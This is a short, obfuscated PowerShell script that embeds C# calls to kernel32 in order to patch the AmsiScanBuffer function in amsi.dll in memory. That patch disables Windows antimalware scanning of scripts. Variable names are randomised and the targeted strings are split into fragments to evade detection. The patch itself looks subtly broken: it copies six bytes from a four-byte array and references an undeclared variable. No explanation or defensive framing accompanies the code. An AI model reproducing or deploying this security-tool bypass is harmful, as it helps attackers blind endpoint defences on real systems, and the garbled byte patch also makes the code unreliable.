$y2UtAQYQI4rY1O = @"
using System;
using System.Runtime.InteropServices;

public class y2UtAQYQI4rY1O {

    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);

    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

}
"@

Add-Type $y2UtAQYQI4rY1O
If (1 -eq 1) {
$IIl3wcjXoWgkc4 = [y2UtAQYQI4rY1O]::LoadLibrary("am" + "s" + "i" + "." + "d" + "l" + "l")
$X5ahZ4sP0qdNpU = [y2UtAQYQI4rY1O]::GetProcAddress($IIl3wcjXoWgkc4, "A" + "m" + "s" + "i" + "S" + "ca" + "n" + "B" + "u" + "ff" + "e" + "r")
$ToXS2D2BVoxcuD = 0
[y2UtAQYQI4rY1O]::VirtualProtect($X5ahZ4sP0qdNpU, [uint32]5, 0x40, [ref]$p)
$RuFe2syUaHbsxd = 51524520
$KC129iTM0m0q6A = [Byte[]] ( 0x00, 0x07, 0x80, 0xC3)
[System.Runtime.InteropServices.Marshal]::Copy($KC129iTM0m0q6A, 0, $X5ahZ4sP0qdNpU, 6)
}
